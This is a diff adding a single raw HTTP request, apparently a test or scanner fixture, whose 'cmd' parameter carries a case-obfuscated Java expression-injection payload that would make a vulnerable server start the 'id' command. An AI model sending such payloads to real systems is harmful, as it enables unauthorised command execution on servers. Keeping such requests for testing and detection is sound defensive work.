@@ -1,0 +1,4 @@
+GET /a?cmd=%23{nEw%20JaVa.LaNg.PrOcEsSbUiLdEr({'Id'}).StArT()} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
